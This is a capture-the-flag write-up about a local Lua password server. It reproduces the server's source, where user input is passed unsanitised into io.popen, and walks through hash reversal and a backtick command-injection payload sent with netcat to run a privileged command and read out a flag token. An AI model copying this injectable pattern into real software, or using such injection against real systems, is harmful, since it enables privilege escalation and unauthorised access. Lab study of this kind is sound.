First of all we can see we have an executable in .lua.
it seems to be a type of server and we can connect to it with the port 5151.
when we try to launch the executable we can se port is already in use so we try to connnect to it.

#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

Then using netcat we connect to the server:
nc 127.0.0.1 5151
we can see the real password is NotSoEasy by reversing the sha1 encryption f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
https://www.dcode.fr/sha1-hash

we first tried this:
nc 127.0.0.1 5151
Password: NotSoEasy
Erf nope..

su flag11
Password: 
su: Authentication failure

using this is not what we want.
then we can use this line:
  prog = io.popen("echo "..pass.." | sha1sum", "r")

popen have as prototype: io.popen(command, mode) opens a pipe to execute a command and returns a file handle.
the command is "echo "..pass.." | sha1sum", The variable pass holds a value that will be interpolated into the command,
.. is an operator for concatenate strings. So now we can manipulate pass to execute getflag.

we cannot execute getflag because we dont have permission to execute it: 
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua

if we do ` getflag ` as password we cannot see the answer because of the pipe for shasum:
so we have to redirect output to a file to be sure to get the ouput of the command:

` getflag > /tmp/response `

then cat the file /tmp/reponse
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s